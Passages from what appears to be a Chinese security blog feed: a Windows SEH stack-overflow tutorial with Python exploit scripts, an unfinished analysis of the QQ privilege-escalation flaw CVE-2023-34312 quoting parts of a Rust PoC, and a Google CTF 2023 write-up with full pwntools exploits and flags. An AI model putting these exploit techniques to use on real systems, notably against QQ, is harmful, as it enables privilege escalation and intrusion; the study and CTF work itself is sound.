class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*<span class="number">0x11c</span> <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">nops = <span class="string">b&quot;\x90&quot;</span>*<span class="number">5</span>                <span class="comment">#nops</span></span><br><span class="line"></span><br><span class="line">payload = offset+NSEH+gadget+shellcode</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p>使用了gadget，进行两次pop抬栈，这样就能滑行到shellcode</p><p><img src="https://img.joe1sn.top/uploads/big/80de864faf1862d894461625d818fcb0.png" alt="image-20230708144240496" /></p><p>gadget过后的跳转</p><p><img src="https://img.joe1sn.top/uploads/big/4bdef43635c0608fb2dd1dce892a899c.png" alt="image-20230708144321174" /></p><p>但是shellcode长度有限制，所以很寄</p><p><img src="https://img.joe1sn.top/uploads/big/c2eae4db075ff3efe7d7addc866d586c.png" alt="img" /></p><p>但是我们执行一小段shellcode，那么可以尝试自己写gadget，将shellcode写入在payload前段，然后利用SEH到自己写的gadget，最后跳转到shellcode，需要注意的是程序会把第五位归0，所以要注意。</p><p>在使用<code>fscanf</code>函数读取字符串时，以下特殊字符可能会导致读取失败或产生意外的结果：</p><ol><li>空格 (<code>0x20</code>)</li><li>制表符 (<code>0x09</code>)</li><li>换行符 (<code>0x0A</code>)</li><li>回车符 (<code>0x0D</code>)</li></ol><p>这块儿就只有自己根据实际情况改进shellcode了。</p><p>那么我稍微改进一下源代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)))</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">vuln();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于栈比较小，可以考虑自己写入gadget来帮助shellcode的跳转</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x11c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">16</span>) <span class="comment">#0x1c</span></span><br><span class="line">test_func = <span class="string">b&quot;\xc4\x16\x40\x00&quot;</span> <span class="comment">#004016C4</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\xee\x19\x40\x00&quot;</span>    <span class="comment">#004019EE 00402537 004017EE</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x14\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">                                                        <span class="comment"># mov eax, esp</span></span><br><span class="line">                                                        <span class="comment"># sub eax, 0x608</span></span><br><span class="line">                                                        <span class="comment"># jmp eax</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">16</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/84688c248714ebea01d6ca5d019c7bb4.gif" alt="img" /></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;[Win Pwn] 基础栈溢出利用&lt;/p&gt;
&lt;p&gt;window下无保护的栈溢出加载shellcode&lt;/p&gt;</summary>
    
    
    
    <category term="notes" scheme="https://joe1sn.eu.org/categories/notes/"/>
    
    
    <category term="windows" scheme="https://joe1sn.eu.org/tags/windows/"/>
    
    <category term="pwn" scheme="https://joe1sn.eu.org/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞复现】CVE-2023-34312分析</title>
    <link href="https://joe1sn.eu.org/2023/07/03/qq-evasion/"/>
    <id>https://joe1sn.eu.org/2023/07/03/qq-evasion/</id>
    <published>2023-07-03T12:13:39.000Z</published>
    <updated>2023-07-18T01:32:15.629Z</updated>
    
    <content type="html"><![CDATA[<p>关于QQ提权漏洞CVE-2023-34312的分析</p><p>！！未完待续！！</p><span id="more"></span><h1 id="poc分析"><a class="markdownIt-Anchor" href="#poc分析"></a> PoC分析</h1><p>PoC地址：<a href="https://github.com/vi3t1/qq-tim-elevation%EF%BC%8C%E7%94%A8rust%E5%86%99%E7%9A%84%E6%8C%89%E7%85%A7%E6%95%99%E7%A8%8B%E7%BC%96%E8%AF%91%E5%A5%BD%E4%BA%86%E5%B0%B1%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E6%89%93%E4%BA%86">https://github.com/vi3t1/qq-tim-elevation，用rust写的按照教程编译好了就可以直接打了</a></p><p>由于没有开启ASLR保护所以很稳</p><p><img src="D:%5CPictures%5Ctypora%5Cpsc.jpg" alt="psc" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703201740757.png" alt="image-20230703201740757" /></p><p>接着是分析一下PoC</p><h2 id="触发"><a class="markdownIt-Anchor" href="#触发"></a> 触发</h2><p>触发方式是<code>.\QQProtect .\evil.dll</code>，同时必须保持<code>tinyxml.dll</code>在同一目录下，这里用QQ9.7.7举例子。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703202240244.png" alt="image-20230703202240244" /></p><p>首先是<a href="https://learn.microsoft.com/en-us/windows/win32/api/processenv/nf-processenv-getcommandlinew"><code>GetCommandLineW</code></a>获得启动参数，接着判断置否存在下列关键参数，然后不存在关键参数直接到了<code>StartAddress</code></p><p>使用<code>QQProtectEngine.dll</code>中的<code>RunQQProtect</code>，设置回调函数<code>sub_40C950</code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203114437.png" alt="image-20230703203114437" /></p><p>回调函数中的<code>a2</code>指针可以将任何地址的值设置为参数分析时的参数个数值，也就是 <strong>1</strong>。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703203402262.png" alt="image-20230703203402262" /></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703211606183.png" alt="image-20230703211606183" /></p><p>那么现在我们就有了将任意地址写为1的能力，恰好<code>QQProtect.exe</code>没有开启<code>ASLR</code>保护，若开启的话下图应该存在<code>IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE </code></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230703204248679.png" alt="image-20230703204248679" /></p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p>和上文中结合起来，在<code>QQProtect</code>中导入了<code>tinyxml.dll</code>，所以可以修改这个dll的内容来执行攻击。</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082005386.png" alt="image-20230704082005386" /></p><ul><li><p>PoC首先获取了<code>evil.dll</code>的路径，</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: <span class="type">String</span> = std::env::<span class="title function_ invoke__">args</span>().<span class="title function_ invoke__">nth</span>(<span class="number">1</span>).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="keyword">let</span> <span class="variable">evil_dllpath</span>: std::path::PathBuf = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;evil_dllpath).<span class="title function_ invoke__">canonicalize</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"><span class="built_in">println!</span>(<span class="string">&quot;evil dll: &#123;&#125;&quot;</span>, evil_dllpath.<span class="title function_ invoke__">display</span>());</span><br></pre></td></tr></table></figure><p>接着打开服务获得<code>QQProtectEngine.dll</code>的基地址（因为他开启了ASLR保护）。<br /><img src="D:%5CPictures%5Ctypora%5Cimage-20230704082356731.png" alt="image-20230704082356731" /><br />在PoC中打开了Windows的<code>QPCore</code>服务然后获取配置信息，从配置信息中提取出<code>qqprotect.exe</code>和<code>QQProtectEngine.dll</code>的路径。<br />由于<code>LoadLibraryExW</code>中使用了<code>DONT_RESOLVE_DLL_REFERENCES</code>所以不会调用DLLMain，若函数成功，则返回值是已加载模块的句柄，从句柄的第一个值提取出加载的地址。注意的是，这里是首先加载<code>tinyxml.dll</code>，所以加载的<code>QQProtectEngine.dll</code>的地址在这里同一样适用，这样就获得了<code>QQProtectEngine.dll</code>的基地址。</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">get_qqprotectengine_dllbase</span>() <span class="punctuation">-&gt;</span> <span class="type">u32</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">manager</span> = ServiceManager::<span class="title function_ invoke__">local_computer</span>(None::&lt;&amp;<span class="type">str</span>&gt;, ServiceManagerAccess::ENUMERATE_SERVICE).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service</span> = manager.<span class="title function_ invoke__">open_service</span>(<span class="string">&quot;QPCore&quot;</span>, ServiceAccess::QUERY_CONFIG).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">service_config</span> = service.<span class="title function_ invoke__">query_config</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotect_exe</span> = windows_args::ArgsOs::<span class="title function_ invoke__">parse_cmd</span>(service_config.executable_path.<span class="title function_ invoke__">as_os_str</span>()).<span class="title function_ invoke__">next</span>().<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">qqprotectengine_dll</span> = std::path::Path::<span class="title function_ invoke__">new</span>(&amp;qqprotect_exe).<span class="title function_ invoke__">parent</span>().<span class="title function_ invoke__">unwrap</span>().<span class="title function_ invoke__">join</span>(<span class="string">&quot;QQProtectEngine.dll&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsafe</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">h</span> = <span class="title function_ invoke__">LoadLibraryExW</span>(<span class="title function_ invoke__">PCWSTR</span>(HSTRING::<span class="title function_ invoke__">from</span>(qqprotectengine_dll.<span class="title function_ invoke__">as_path</span>()).<span class="title function_ invoke__">as_ptr</span>()), HANDLE::<span class="title function_ invoke__">default</span>(), DONT_RESOLVE_DLL_REFERENCES).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">base</span> = h.<span class="number">0</span> <span class="keyword">as</span> <span class="type">u32</span>;</span><br><span class="line">        <span class="title function_ invoke__">FreeLibrary</span>(h);</span><br><span class="line">        <span class="keyword">return</span> base;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建IPC进程间通讯</p><p>如何找到IPC通讯，可以在<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist%E5%AE%89%E8%A3%85%60pipelist%60%E6%9F%A5%E7%9C%8B%E6%89%80%E6%9C%89%E7%9A%84%E5%91%BD%E5%90%8D%E7%AE%A1%E9%81%93%E9%80%9A%E8%AE%AF">https://learn.microsoft.com/en-us/sysinternals/downloads/pipelist安装`pipelist`查看所有的命名管道通讯</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716221331756.png" alt="image-20230716221331756" /></p><p>那么在<code>QQProtect.exe</code>一定会有一个连接命名管道的地方，在<code>QQProtectEnginee.dll</code>中使用</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230155905.png" alt="image-20230716230155905" /></p><p>找到对应的管道命名</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716230225143.png" alt="image-20230716230225143" /></p><p>和</p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230716232640237.png" alt="image-20230716232640237" /></p><p>（回调分析麻了）之后会进入QSection.dll中的函数，具体逆向可以看B战大佬的视频：<a href="https://www.bilibili.com/video/BV1wm4y1E7TL">https://www.bilibili.com/video/BV1wm4y1E7TL</a></p><p><img src="D:%5CPictures%5Ctypora%5Cimage-20230717091525707.png" alt="image-20230717091525707" /></p><p>很像一个结构体。加载了<code>QPSection</code>后调用了6号导出函数，之后还需要对结构体进行逆向</p></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;关于QQ提权漏洞CVE-2023-34312的分析&lt;/p&gt;
&lt;p&gt;！！未完待续！！&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>【CTF】2023 Google CTF WriteUp与复现</title>
    <link href="https://joe1sn.eu.org/2023/06/26/googleCTF-wp/"/>
    <id>https://joe1sn.eu.org/2023/06/26/googleCTF-wp/</id>
    <published>2023-06-26T15:44:49.000Z</published>
    <updated>2023-06-27T12:28:50.376Z</updated>
    
    <content type="html"><![CDATA[<p>端午节打的比赛，事情比较多没怎么看题，指导学弟做了下，这里来个复盘。</p><p>开始CTF的复健之路吧。</p><span id="more"></span><h1 id="pwn"><a class="markdownIt-Anchor" href="#pwn"></a> Pwn</h1><h2 id="write-flag-where"><a class="markdownIt-Anchor" href="#write-flag-where"></a> WRITE-FLAG-WHERE</h2><p>最简单的一道pwn，没有开ASLR保护。当时我的机器跑不起来，学弟的能跑，和他一起分析。</p><p>程序的主逻辑是读取<code>/proc/self/maps</code>来读取存在的内存（gdb中的vmmap就是这样实现的），然后把 <strong>flag</strong> 读取到一个全局变量中，最后我们可以在任意一个地址<strong>写入</strong>任意长度（<code>&lt;0x7f</code>）的<code>flag</code>中的字符串。</p><p>当时我们是在arch上做的，使用gdb能看到输出，然后尝试将flag覆盖内存中的提示语句</p><p><img src="https://img.joe1sn.top/uploads/big/db64be7c974c4b8874990bf43ad75d96.png" alt="image-20230626235900892" /></p><p>那么地址就是 <code>*$rebase(0x21E0)</code>，尝试远程</p><p><img src="https://img.joe1sn.top/uploads/big/7e185357a6df34bb8a05fe88e2715475.png" alt="image-20230627000119117" /></p><p>得到flag</p><blockquote><p>CTF{Y0ur_j0urn3y_is_0n1y_ju5t_b39innin9}</p></blockquote><h2 id="write-flag-where-2"><a class="markdownIt-Anchor" href="#write-flag-where-2"></a> WRITE-FLAG-WHERE 2</h2><p>当时离做出来差了亿点点。</p><p>保护没变，但是删除了之前的字符串修改点。后来我看到了有一段无关的代码段</p><p><img src="https://img.joe1sn.top/uploads/big/aceaa896af8bd2be3eee5d25bceb04c8.png" alt="image-20230627000724135" /></p><p>后来想这道题快想魔怔了</p><h3 id="未解出使用sscanf覆盖"><a class="markdownIt-Anchor" href="#未解出使用sscanf覆盖"></a> 【未解出】使用sscanf覆盖</h3><p><img src="https://img.joe1sn.top/uploads/big/0e87335c869798bc686b697a732f6b20.png" alt="image-20230627000846031" /></p><p>挺疯狂的一个想法，由于死循环内不存在输入，但是sscanf会根据你的输入去匹配，然后我们又知道flag是<code>CTF&#123;xxxx&#125;</code>，所以可以覆盖<code>0x%llx %u</code>的第一个，类似于：</p><p><img src="https://img.joe1sn.top/uploads/big/44c200a9d509624944d2043e3844fd92.png" alt="image-20230627001051107" /></p><p>逐步缩小地址爆破得到flag，但是考虑到工作量而且太久没做CTF导致pwntools的不熟悉没有能成功</p><h3 id="差一点可视化shellcode"><a class="markdownIt-Anchor" href="#差一点可视化shellcode"></a> 【差一点】可视化shellcode</h3><p>和上面的思路差不多，只不过是利用了<code>T</code>的ASCII为<code>0x54</code>，而<code>0x54</code>的汇编码是<code>push rsp</code>，那么一直写入<code>T</code>，让最后的退出划入那段不相关的代码段</p><p><img src="https://img.joe1sn.top/uploads/big/c680a99fbe9de70f0ceb090c72232757.png" alt="image-20230627001337193" /></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">nop2</span>(<span class="params">addr,lenth</span>):</span><br><span class="line">  r.sendline(<span class="string">b&quot;0x%x %d&quot;</span> % (addr+base,lenth))</span><br><span class="line">  sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line">nop2(<span class="number">0x20d5</span>,<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    nop2(<span class="number">0x1443</span>-i,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.sendline(<span class="string">b&quot;0x1234 111111&quot;</span>)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/7092af8c58cfd633f124fae3ad84d73a.png" alt="image-20230627015659635" /></p><p>最后得到flag</p><blockquote><p>CTF{impr355iv3_6ut_can_y0u_s01v3_cha113ng3_3?}</p></blockquote><p><strong>注意：由于网络延时最后的flag不开代理导致没有收到…</strong></p><h2 id="write-flag-where-3"><a class="markdownIt-Anchor" href="#write-flag-where-3"></a> WRITE-FLAG-WHERE 3</h2><p>上一道题直接导致心态爆炸，这道题没怎么看。不过看上去限制了我们能修改的地址范围 <strong>不能</strong> 是<code>main</code>函数±<code>0x5000</code>的位置，导致之前的exp失效。</p><p><img src="https://img.joe1sn.top/uploads/big/e5d935cfb2c1e29b8fb6f314e69cf4b1.png" alt="image-20230627011217278" /></p><p>不过本地patched过的版本成功调用了<code>alarm</code></p><p><img src="https://img.joe1sn.top/uploads/big/7eb896172074ac45b77a71ffa43d81af.png" alt="image-20230627013114680" /></p><p>那么试试修改libc中的报错为flag，但是不行</p><p>不过思路也是很接近的了，在官方的exp中使用了<code>&#125;</code>，作为<code>jnp</code>来进行爆破。其他也是使用了一下gadget，利用<code>jnp 0x48</code>实现ROP的跳转</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r3tr0@pwnmachine:~$ rasm2 -ax86 -b64 -d 0x4354467b4354 </span><br><span class="line">push r12</span><br><span class="line">jnp 0x48</span><br><span class="line">push rsp</span><br></pre></td></tr></table></figure><ol><li>使用2中的思路覆写libc中的<code>exit</code></li><li>由于输入位于栈上使用，输入组合的ROP链，由于libc中的<code>exit</code>已经被覆写，所以程序会返回<code>ret</code>，从而触发ROP链，最后实现write写出flag</li></ol><p>这里使用r3kpig的exp打一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>, <span class="string">&#x27;-F&#x27;</span> <span class="string">&#x27;#&#123;pane_pid&#125;&#x27;</span>, <span class="string">&#x27;-P&#x27;</span>]</span><br><span class="line"><span class="comment"># p=process(&#x27;./main&#x27;,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line"><span class="comment"># exit(1)</span></span><br><span class="line">sh=<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">b *0x555555555478</span></span><br><span class="line"><span class="string">b *0x555555555491</span></span><br><span class="line"><span class="string">b exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># p = process(&quot;./chal&quot;)</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&quot;./chal&quot;,sh,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;)</span></span><br><span class="line">p = remote(<span class="string">&quot;wfw3.2023.ctfcompetition.com&quot;</span>,<span class="number">1337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ch</span>(<span class="params">addr,l</span>):</span><br><span class="line">    target = addr</span><br><span class="line">    pay = <span class="built_in">hex</span>(target).encode()+<span class="string">b&quot; &quot;</span>+<span class="built_in">str</span>(l).encode()</span><br><span class="line">    p.send(pay.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>(<span class="params">l</span>):</span><br><span class="line">    p.send(flat(l).ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\xff&#x27;</span>))</span><br><span class="line">    p.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nop</span>(<span class="params">addr,l</span>):</span><br><span class="line">    <span class="keyword">if</span> l%<span class="number">2</span>!=<span class="number">0</span>:</span><br><span class="line">        l=l-<span class="number">1</span></span><br><span class="line">        ch(addr+l-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,l,<span class="number">2</span>):</span><br><span class="line">        ch(addr+x,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">b&quot; expire\n&quot;</span>)</span><br><span class="line">PIE = <span class="built_in">int</span>(p.readuntil(<span class="string">b&quot;-&quot;</span>)[:-<span class="number">1</span>],<span class="number">0x10</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(PIE))</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    ru(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(p.readuntil(<span class="string">b&quot;-&quot;</span>)[:-<span class="number">1</span>],<span class="number">0x10</span>)</span><br><span class="line">info(<span class="built_in">hex</span>(base))</span><br><span class="line">ru(<span class="string">b&quot;\n\n&quot;</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x1b</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x17</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x2b</span>-<span class="number">3</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x2b</span>-<span class="number">2</span>+base,<span class="number">2</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x1f</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x4</span>+base,<span class="number">1</span>)</span><br><span class="line">ch(<span class="number">0x455f0</span>+<span class="number">0x26</span>+base,<span class="number">1</span>)</span><br><span class="line">rdi = <span class="number">0x000000000002a3e5</span>+base</span><br><span class="line">bprintf = <span class="number">0x555555555090</span>-<span class="number">0x555555554000</span>+PIE</span><br><span class="line">flag = <span class="number">0x5555555590A0</span>-<span class="number">0x555555554000</span>+PIE</span><br><span class="line">rsi = <span class="number">0x000000000002be51</span>+base</span><br><span class="line">end([rdi,<span class="number">1337</span>,rsi,flag,bprintf,])</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img 